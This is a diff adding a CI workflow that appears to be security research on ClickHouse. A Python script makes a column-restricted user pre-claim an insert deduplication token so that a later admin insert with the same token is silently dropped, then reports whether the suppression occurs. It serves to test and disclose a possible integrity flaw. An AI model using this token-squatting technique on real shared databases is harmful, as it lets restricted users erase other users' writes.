@@ -1,0 +1,82 @@
+name: Column-grant x dedup token x HTTP request cross-user insert integrity
+on:
+  push:
+    branches: [research-clickhouse-http-path-protocol-20261113]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  cross-feature:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    strategy:
+      fail-fast: false
+      matrix:
+        image: ["26.10.3.7","head"]
+    steps:
+      - name: Start official ClickHouse
+        shell: bash
+        run: |
+          docker run -d --name ch --network host --memory 3g --ulimit nofile=262144:262144 \
+            -e CLICKHOUSE_USER=admin -e CLICKHOUSE_PASSWORD=synthetic-admin-password \
+            -e CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT=1 \
+            clickhouse/clickhouse-server:${{ matrix.image }}
+          for i in {1..95}; do
+            if curl -fsS -u admin:synthetic-admin-password 'http://127.0.0.1:8123/?query=SELECT%201' >/dev/null; then break; fi
+            sleep 2
+          done
+          curl -fsS -u admin:synthetic-admin-password 'http://127.0.0.1:8123/?query=SELECT%20version()'
+      - name: Probe cross-user dedup under restricted INSERT column grants
+        shell: bash
+        run: |
+          cat >/tmp/test.py <<'PY'
+          import base64,urllib.request,urllib.error,urllib.parse
+          users={"admin":"synthetic-admin-password","limited":"synthetic-limited-password"}
+          def call(sql,u="admin",params=""):
+              url="http://127.0.0.1:8123/"+("?"+params if params else "")
+              req=urllib.request.Request(url,data=sql.encode(),method="POST")
+              req.add_header("Authorization","Basic "+base64.b64encode(f"{u}:{users[u]}".encode()).decode())
+              try:
+                  with urllib.request.urlopen(req,timeout=22) as r:return r.status,r.read().decode(errors="replace").strip()
+              except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace").strip()
+          def query(q,u="admin",params=""):
+              c,b=call(q,u,params)
+              print("SQL",u,repr(q),repr(params),c,repr(b[:350]),flush=True)
+              return c,b
+          def setup(q):
+              c,b=query(q)
+              if c!=200:raise RuntimeError(f"SETUP FAILED: {q}: {c} {b}")
+          setup("CREATE DATABASE token_lab")
+          setup("CREATE TABLE token_lab.rows (secret UInt64 DEFAULT 0, benign UInt64 DEFAULT 0) ENGINE=MergeTree ORDER BY (secret,benign) SETTINGS non_replicated_deduplication_window=100")
+          setup("CREATE USER limited IDENTIFIED WITH plaintext_password BY 'synthetic-limited-password'")
+          setup("GRANT INSERT(benign) ON token_lab.rows TO limited")
+          assert query("SELECT secret FROM token_lab.rows","limited")[0]==403
+          assert query("INSERT INTO token_lab.rows (secret) VALUES (1111)","limited")[0]==403
+          # Baseline confirms we can generate ordinary inserts with different tokens.
+          assert query("INSERT INTO token_lab.rows (secret) VALUES (1112)","admin","insert_deduplication_token=baseline-A")[0]==200
+          assert query("INSERT INTO token_lab.rows (secret) VALUES (1113)","admin","insert_deduplication_token=baseline-B")[0]==200
+          # Attacker can modify only benign. Denied direct write to secret, but chooses a dedup token for the shared table.
+          c,b=query("INSERT INTO token_lab.rows (benign) VALUES (54)","limited","insert_deduplication_token=chosen-shared-idempotency-key")
+          print("RESTRICTED_INSERT",c,repr(b[:300]),flush=True)
+          if c!=200:raise RuntimeError("Attack precondition failed: limited INSERT(benign) not allowed")
+          c,b=query("INSERT INTO token_lab.rows (secret) VALUES (733331)","admin","insert_deduplication_token=chosen-shared-idempotency-key")
+          print("ADMIN_SAME_TOKEN",c,repr(b[:300]),flush=True)
+          if c!=200:raise RuntimeError("Admin insert failed instead of expected successful response")
+          c,b=query("INSERT INTO token_lab.rows (secret) VALUES (744442)","admin","insert_deduplication_token=independent-key")
+          print("ADMIN_DISTINCT_TOKEN_CONTROL",c,repr(b[:300]),flush=True)
+          if c!=200:raise RuntimeError("Admin distinct token control failed")
+          c,b=query("SELECT secret,benign FROM token_lab.rows ORDER BY secret,benign LIMIT 15 SETTINGS max_execution_time=10,max_rows_to_read=100")
+          print("ROWS",c,repr(b),flush=True)
+          if c!=200:raise RuntimeError(b)
+          rows={tuple(map(int,r.split("\t"))) for r in b.splitlines() if "\t" in r}
+          print("CROSS_USER_TOKEN_SUPPRESSION", (733331,0) not in rows and (744442,0) in rows and (0,54) in rows,flush=True)
+          if (733331,0) in rows:
+              print("NO_UNAUTHORIZED_INTEGRITY_EFFECT: admin shared token insert preserved",flush=True)
+          else:
+              print("TECHNICAL_EFFECT_CONFIRMED: shared token suppressed admin row; by-design and threat model must be assessed",flush=True)
+          assert (744442,0) in rows
+          PY
+          python3 /tmp/test.py
+      - name: Docker logs if failure
+        if: failure()
+        run: docker logs ch 2>&1 | tail -70
